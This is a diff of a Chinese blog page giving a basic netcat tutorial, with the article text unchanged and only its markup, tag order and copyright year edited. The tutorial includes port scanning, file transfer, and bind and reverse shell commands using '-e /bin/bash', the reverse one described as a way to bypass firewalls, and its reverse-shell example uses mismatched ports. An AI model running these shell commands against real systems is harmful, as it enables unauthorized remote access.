@@ -332,12 +332,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">网络渗透</span>
-                            </a>
-                        
                             <a href="/tags/netcat/">
                                 <span class="chip bg-color">netcat</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">网络渗透</span>
                             </a>
                         
                     </div>
@@ -403,13 +403,11 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><h2 id="netcat的简介"><a href="#netcat的简介" class="headerlink" title="netcat的简介"></a>netcat的简介</h2><p>netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p>
-<h2 id="netcat的安装"><a href="#netcat的安装" class="headerlink" title="netcat的安装"></a>netcat的安装</h2><h3 id="linux安装："><a href="#linux安装：" class="headerlink" title="linux安装："></a>linux安装：</h3><pre><code>sudo apt install netcat</code></pre>
+<h2 id="netcat的安装"><a href="#netcat的安装" class="headerlink" title="netcat的安装"></a>netcat的安装</h2><h3 id="linux安装："><a href="#linux安装：" class="headerlink" title="linux安装："></a>linux安装：</h3><p><pre><code>sudo apt install netcat</code></pre></p>
 <h3 id="windows安装："><a href="#windows安装：" class="headerlink" title="windows安装："></a>windows安装：</h3><p>点击这里<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">netcat</a>下载netcat的文件和配置。</p>
 <h4 id="windows配置："><a href="#windows配置：" class="headerlink" title="windows配置："></a>windows配置：</h4><p>进入下载netcat的目录，按住左shift+鼠标右键选择powershell输入：</p>
-<pre><code>.\netcat</code></pre>
-<p>当出现<code>Cmd line:</code>就配置成功，你可以配置环境变量点这里<a target="_blank" rel="noopener" href="https://blog.csdn.net/BoomLee/article/details/102563472">怎么设置环境变量</a></p>
-<h2 id="netcat的使用"><a href="#netcat的使用" class="headerlink" title="netcat的使用"></a>netcat的使用</h2><h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><pre><code>nc -z -v -n 127.0.0.1 21-25</code></pre>
-<p>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.<br>-z 参数告诉netcat使用0 IO,连接成功后立即关闭连接，不进行数据交换<br>-v 参数指使用冗余选项，即详细输出<br>-n 参数告诉netcat 不使用DNS解析，即仅仅是一串IP数字， 一般如果后面是跟IP数字的话，就带上-n参数；跟着是域名的话，就不带-n参数。</p>
+<p><pre><code>.\netcat</code></pre><br>当出现<code>Cmd line:</code>就配置成功，你可以配置环境变量点这里<a target="_blank" rel="noopener" href="https://blog.csdn.net/BoomLee/article/details/102563472">怎么设置环境变量</a></p>
+<h2 id="netcat的使用"><a href="#netcat的使用" class="headerlink" title="netcat的使用"></a>netcat的使用</h2><h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><p><pre><code>nc -z -v -n 127.0.0.1 21-25</code></pre><br>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.<br>-z 参数告诉netcat使用0 IO,连接成功后立即关闭连接，不进行数据交换<br>-v 参数指使用冗余选项，即详细输出<br>-n 参数告诉netcat 不使用DNS解析，即仅仅是一串IP数字， 一般如果后面是跟IP数字的话，就带上-n参数；跟着是域名的话，就不带-n参数。</p>
 <h3 id="聊天服务"><a href="#聊天服务" class="headerlink" title="聊天服务"></a>聊天服务</h3><p>服务端(ip=192.168.1.7)：<pre><code>nc -l -p 4444</code></pre>4444是开放的端口<br>客户端:<pre><code>nc 192.168.1.8</code></pre>192.168.1.7是服务端的IP地址<br>客户端和服务端是同一网端下!检测是否在同一网段可以采用互相ping ip<br>可以点击这里查看详细记录<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/69628323.html">百度教程</a></p>
 <h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>例子环境：</p>
 <ul>
@@ -417,17 +415,13 @@
 <li>B电脑ip:192.168.1.3</li>
 </ul>
 <p>A电脑为服务端，B电脑为客户端。以a文件为要发送的文件。服务端要发送a文件到客户端，客户端则接受服务端发来的a文件。<br>A电脑命令如下：</p>
-<pre><code>nc -l -p 4444 < a </code></pre>
-<p>B电脑命令如下:</p>
-<pre><code> nc 192.168.1.2 4444 > a</code></pre>
-<p>反正则调换一下</p>
+<p><pre><code>nc -l -p 4444 < a </code></pre><br>B电脑命令如下:</p>
+<p><pre><code> nc 192.168.1.2 4444 > a</code></pre><br>反正则调换一下</p>
 <h3 id="shell连接"><a href="#shell连接" class="headerlink" title="shell连接"></a>shell连接</h3><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1:正向连接"></a>1:正向连接</h4><h6 id="例子环境："><a href="#例子环境：" class="headerlink" title="例子环境："></a>例子环境：</h6><ul>
 <li>A电脑ip:192.168.1.2</li>
 <li>B电脑ip:192.168.1.3<h6 id="例子情况-用B电脑连接A电脑shell"><a href="#例子情况-用B电脑连接A电脑shell" class="headerlink" title="例子情况:用B电脑连接A电脑shell"></a>例子情况:用B电脑连接A电脑shell</h6></li>
 <li>A电脑为服务端</li>
-<li>B电脑为客户端<br>服务端命令如下：<pre><code>nc -l -p 4444 -e /bin/bash</code></pre>
-客户端命令如下：<pre><code>nc 192.168.1.2</code></pre>
-<h4 id="2-反面连接-用于绕过防火墙"><a href="#2-反面连接-用于绕过防火墙" class="headerlink" title="2.反面连接(用于绕过防火墙)"></a>2.反面连接(用于绕过防火墙)</h4><h6 id="例子环境：-1"><a href="#例子环境：-1" class="headerlink" title="例子环境："></a>例子环境：</h6></li>
+<li>B电脑为客户端<br>服务端命令如下：<br><pre><code>nc -l -p 4444 -e /bin/bash</code></pre><br>客户端命令如下：<br><pre><code>nc 192.168.1.2</code></pre><h4 id="2-反面连接-用于绕过防火墙"><a href="#2-反面连接-用于绕过防火墙" class="headerlink" title="2.反面连接(用于绕过防火墙)"></a>2.反面连接(用于绕过防火墙)</h4><h6 id="例子环境：-1"><a href="#例子环境：-1" class="headerlink" title="例子环境："></a>例子环境：</h6></li>
 <li>A电脑ip:192.168.1.2</li>
 <li>B电脑ip:192.168.1.3<h6 id="例子情况："><a href="#例子情况：" class="headerlink" title="例子情况："></a>例子情况：</h6></li>
 <li>1.A机器连接B机器的shell，如果按照正向shell的做法，应该是把A当成netcat的客户端，把B当成netcat的服务端，在B上用-l参数监听输入的链接。</li>
@@ -435,9 +429,8 @@
 <li>3.反向shell的做法是把A当成netcat的客户端，把B当成netcat的客户端，然后在A上用-l参数监听netcat的链接。</li>
 </ul>
 <p>A电脑命令如下：</p>
-<pre><code>nc -l -p 20000</code></pre>
-<p>B电脑命令如下:</p>
-<pre><code>nc 192.168.1.3 4444 -e /bin/bash</code></pre>
+<p><pre><code>nc -l -p 20000</code></pre><br>B电脑命令如下:</p>
+<p><pre><code>nc 192.168.1.3 4444 -e /bin/bash</code></pre></p>
 <h2 id="结言"><a href="#结言" class="headerlink" title="结言:"></a>结言:</h2><p>本博文是netcat的基础用法。欢迎订阅rss和打赏，请作者喝一杯冰可乐吧！</p>
 
                 
@@ -503,12 +496,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">网络渗透</span>
-                                </a>
-                            
                                 <a href="/tags/netcat/">
                                     <span class="chip bg-color">netcat</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">网络渗透</span>
                                 </a>
                             
                         </div>
@@ -949,7 +942,7 @@
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2021-2024</span>
+                <span id="year">2021-2025</span>
             
             <span id="year">2021</span>
             <a href="/about" target="_blank">haclm</a>
